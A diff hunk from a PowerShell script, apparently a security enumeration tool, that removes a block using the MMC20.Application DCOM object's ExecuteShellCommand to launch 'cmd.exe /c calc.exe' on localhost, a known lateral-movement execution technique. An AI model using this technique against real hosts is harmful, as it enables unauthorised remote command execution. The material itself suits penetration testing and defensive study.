@@ -1315,19 +1315,6 @@ function checkDCOMLateralMovement {
                 $appSetting = Get-CimInstance -Query "SELECT * FROM Win32_DCOMApplicationSetting WHERE AppID='$appID'"
                 $runAsUser = "None"
 
-                 # Check specifically for MMC20.Application
-                 if ($appName -like "*MMC20*") {
-                    Write-Output "[+] Found MMC20.Application: $appID"
-                    # Here we can directly execute a command via MMC20.Application - This only makes sense if it's elevated though
-                    try {
-                        $com = [Activator]::CreateInstance([Type]::GetTypeFromProgID("MMC20.Application", "127.0.0.1")) # Example IP
-                        $com.Document.ActiveView.ExecuteShellCommand("cmd.exe", "/c calc.exe")
-                        Write-Output "[+] Command executed via MMC20.Application on local host."
-                    } catch {
-                        Write-Output "[-] Error executing command via MMC20.Application: $_"
-                    }
-                }
-
                 # Check specifically for ShellWindows
                 if ($appName -eq "ShellWindows") { # ShellWindows CLSID
                     Write-Output "[+] Found ShellWindows: $appID"
